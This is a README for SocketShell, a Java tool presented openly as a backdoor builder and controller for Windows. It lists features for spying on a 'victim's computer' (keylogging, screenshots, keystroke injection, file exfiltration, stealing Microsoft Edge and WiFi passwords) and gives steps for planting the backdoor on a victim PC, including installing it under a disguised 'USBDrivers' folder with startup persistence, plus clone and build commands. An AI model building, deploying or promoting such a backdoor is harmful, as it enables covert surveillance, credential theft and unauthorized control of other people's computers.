# SocketShell
Typically, reverse shell utilities such as Netcat have 2 main functions, to pipe remote input into cmd or bash, and output the response.
This is useful, but it is also limited.
SocketShell overcomes these limitations by including the ability to inject keystrokes, get screenshots, transfer files, and many other tasks.

## Features
SocketShell is a backdoor compiling and controlling tool.

This backdoor can:
- Run Command Prompt commands
- Run PowerShell scripts
- Run DuckyScripts to inject keystrokes
- Exfiltrate files based on extension
- Exfiltrate Microsoft Edge and WiFi passwords
- Send and receive files to and from victim's computer
- Start a KeyLogger
- Get a screenshot of victim's computer

To compile the backdoor, SocketShell:
- Writes and encrypts your private IP address to 'ip.txt' in directory 'backdoor'.
- Copies the necessary jar files to 'backdoor'.
- If desired, copies a Java Runtime Environment to 'backdoor'.
- Creates batch files in 'backdoor' for running the jar files in a packaged Java Runtime Environment.
- Copies all '.duck' DuckyScripts and '.ps1' PowerShell scripts to 'backdoor'.

To start the backdoor on a victim PC, transfer all files from the directory 'backdoor' onto a victim PC and execute either run.bat or install.bat.

run.bat will:
- Start the backdoor
- Display information for controlling the backdoor

install.bat will:
- Install the backdoor to 'C:\ProgramData\USBDrivers'
- Add the backdoor to startup (if executed as administrator)
- Run the backdoor
- Display information for controlling the backdoor

Once running, to control the backdoor you must return to SocketShell and run option 1 at start while connected to the same WiFi network as the victim's computer.

## Requirements
- A Java JDK distribution must be installed and added to PATH with label JAVA_HOME.
- You must use the same computer to compile and control the backdoor.
  - The computer used to compile the backdoor must be on the same WiFi network as the victim's computer.
  - The IPv4 address of this computer must remain static in the time between compiling the backdoor and controlling it.
- The computer used to control the backdoor must have their firewall deactivated.

## Compatibility
SocketShell is compatible with Windows and Linux, while the backdoor is only compatible with Windows.

## Installation
```
# clone SocketShell
git clone https://github.com/ThatcherDev/SocketShell.git

# change the working directory to SocketShell
cd SocketShell

# build SocketShell with Maven
# for Linux run
chmod +x mvnw
./mvnw clean package

# for Windows run
mvnw.cmd clean package
```

## Usage
```
# run SocketShell
java -jar socketshell.jar
```

## License
- [MIT](https://choosealicense.com/licenses/mit/)
- Copyright 2019© ThatcherDev.
